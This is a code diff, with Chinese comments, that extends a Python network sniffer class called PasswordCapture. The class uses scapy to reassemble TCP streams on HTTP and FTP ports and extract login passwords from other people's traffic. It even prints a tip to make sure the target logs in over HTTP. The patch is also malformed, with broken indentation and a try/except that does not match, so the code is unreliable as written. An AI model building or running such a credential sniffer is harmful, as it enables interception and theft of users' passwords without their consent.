@@ -20,37 +20,136 @@ class PasswordCapture:
         self.captured_hashes = []
         self.capture_thread = None
         self.interface = None
+        self.packet_count = 0
+        self.last_packet_time = None
     
     def _capture_packets(self, interface=None):
         """捕獲資料包並提取密碼"""
+        # 用於重組TCP流的字典
+        tcp_streams = {}
+        
         def process_packet(packet):
             if not self.capturing:
                 return
             
-            if packet.haslayer(Raw) and packet.haslayer(IP) and packet.haslayer(TCP):
-                try:
-                    load = packet[Raw].load.decode('utf-8', errors='ignore')
+            try:
+                # 更新統計
+                self.packet_count += 1
+                self.last_packet_time = time.time()
+                
+                # 每1000個資料包輸出一次狀態
+                if self.packet_count % 1000 == 0:
+                    print(f"[*] 已處理 {self.packet_count} 個資料包...")
+                
+                if not (packet.haslayer(IP) and packet.haslayer(TCP)):
+                    return
+                
+                # 處理HTTP（端口80）、FTP（端口21）和其他可能包含憑證的流量
+                src_ip = packet[IP].src
+                dst_ip = packet[IP].dst
+                src_port = packet[TCP].sport
+                dst_port = packet[TCP].dport
+                
+                # 建立流標識符
+                stream_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
+                
+                if packet.haslayer(Raw):
+                    load = packet[Raw].load
                     
-                    # 檢測HTTP POST請求中的密碼
-                    if 'POST' in load and ('password' in load.lower() or 'passwd' in load.lower() or 'login' in load.lower()):
-                        self._extract_http_credentials(load, packet)
+                    # 嘗試重組TCP流
+                    if stream_id not in tcp_streams:
+                        tcp_streams[stream_id] = b''
                     
-                    # 檢測FTP密碼
-                    if ('USER' in load or 'PASS' in load) and ('220' in load or '331' in load or '230' in load):
-                        self._extract_ftp_credentials(load, packet)
+                    tcp_streams[stream_id] += load
                     
-                    # 檢測其他協定的憑證
-                    self._extract_generic_credentials(load, packet)
-                except Exception as e:
-                    pass
+                            # 檢查是否包含完整的HTTP請求
+                            try:
+                                full_data = tcp_streams[stream_id].decode('utf-8', errors='ignore')
+                                
+                                # 檢查是否包含HTTP請求結束標記或流太長
+                                if '\r\n\r\n' in full_data or len(tcp_streams[stream_id]) > 4096:
+                                    # 調試輸出
+                                    if 'POST' in full_data:
+                                        print(f"[DEBUG] 檢測到POST請求 (長度: {len(full_data)})")
+                                        if 'password' in full_data.lower() or 'login' in full_data.lower():
+                                            print(f"[DEBUG] POST請求包含登入相關欄位")
+                                    
+                                    # 檢測HTTP POST請求中的密碼
+                                    if 'POST' in full_data and ('password' in full_data.lower() or 'passwd' in full_data.lower() or 'login' in full_data.lower()):
+                                        print(f"[+] 嘗試提取HTTP憑證...")
+                                        self._extract_http_credentials(full_data, packet)
+                                    
+                                    # 檢測FTP密碼
+                                    if ('USER' in full_data or 'PASS' in full_data) and ('220' in full_data or '331' in full_data or '230' in full_data):
+                                        print(f"[+] 嘗試提取FTP憑證...")
+                                        self._extract_ftp_credentials(full_data, packet)
+                                    
+                                    # 檢測其他協定的憑證
+                                    self._extract_generic_credentials(full_data, packet)
+                                    
+                                    # 清理已處理的流
+                                    if len(tcp_streams) > 100:
+                                        oldest = min(tcp_streams.keys(), key=lambda k: len(tcp_streams[k]))
+                                        del tcp_streams[oldest]
+                    except:
+                        # 如果解碼失敗，嘗試直接處理單個資料包
+                        try:
+                            load_str = load.decode('utf-8', errors='ignore')
+                            if 'POST' in load_str and ('password' in load_str.lower() or 'passwd' in load_str.lower()):
+                                self._extract_http_credentials(load_str, packet)
+                            if 'USER' in load_str or 'PASS' in load_str:
+                                self._extract_ftp_credentials(load_str, packet)
+                        except:
+                            pass
+                else:
+                    # 沒有Raw層，清理對應的流
+                    if stream_id in tcp_streams and len(tcp_streams) > 50:
+                        del tcp_streams[stream_id]
+            except Exception as e:
+                # 輸出錯誤以便調試
+                if self.capturing:
+                    print(f"[!] 處理資料包錯誤: {e}")
         
         try:
+            # 使用BPF過濾器捕獲HTTP（80）、FTP（21）和其他常見端口
+            bpf_filter = "tcp port 80 or tcp port 21 or tcp port 8080"
+            
+            print(f"[*] 開始捕獲網路流量")
+            print(f"[*] 過濾器: {bpf_filter}")
             if interface:
-                sniff(iface=interface, prn=process_packet, stop_filter=lambda x: not self.capturing, store=False)
+                print(f"[*] 使用網路介面: {interface}")
+            print(f"[*] 提示: 確保目標正在使用HTTP進行登入")
+            print(f"[*] 提示: 如果沒有看到資料包，請檢查是否有HTTP流量經過此介面")
+            
+            if interface:
+                sniff(iface=interface, filter=bpf_filter, prn=process_packet, 
+                      stop_filter=lambda x: not self.capturing, store=False)
             else:
-                sniff(prn=process_packet, stop_filter=lambda x: not self.capturing, store=False)
+                sniff(filter=bpf_filter, prn=process_packet, 
+                      stop_filter=lambda x: not self.capturing, store=False)
+        except PermissionError:
+            print("[!] 權限錯誤: 需要root權限來捕獲網路流量")
+            print("[!] 請使用: sudo python3 main.py")
+            self.capturing = False
+        except OSError as e:
+            if "No such device" in str(e) or "Device not found" in str(e):
+                print(f"[!] 網路介面錯誤: {interface} 不存在")
+                print("[*] 可用的介面:")
+                try:
+                    from scapy.all import get_if_list
+                    for iface in get_if_list():
+                        print(f"  - {iface}")
+                except:
+                    pass
+                self.capturing = False
+            else:
+                print(f"[!] 密碼捕獲錯誤: {e}")
+                self.capturing = False
         except Exception as e:
             print(f"[!] 密碼捕獲錯誤: {e}")
+            import traceback
+            traceback.print_exc()
+            self.capturing = False
     
     def _extract_http_credentials(self, data, packet):
         """從HTTP資料中提取憑證"""
@@ -195,6 +294,7 @@ class PasswordCapture:
             self.interface = interface
             self.capturing = True
             self.captured_passwords = []  # 重置捕獲的密碼
+            self.packet_count = 0  # 重置計數器
             
             self.capture_thread = threading.Thread(target=self._capture_packets, args=(interface,), daemon=True)
             self.capture_thread.start()
@@ -219,6 +319,7 @@ class PasswordCapture:
         if self.capture_thread:
             self.capture_thread.join(timeout=2)
         print("[+] 密碼捕獲已停止")
+        print(f"[*] 總共處理 {self.packet_count} 個資料包")
         print(f"[*] 總共捕獲 {len(self.captured_passwords)} 組密碼")
         return True
     
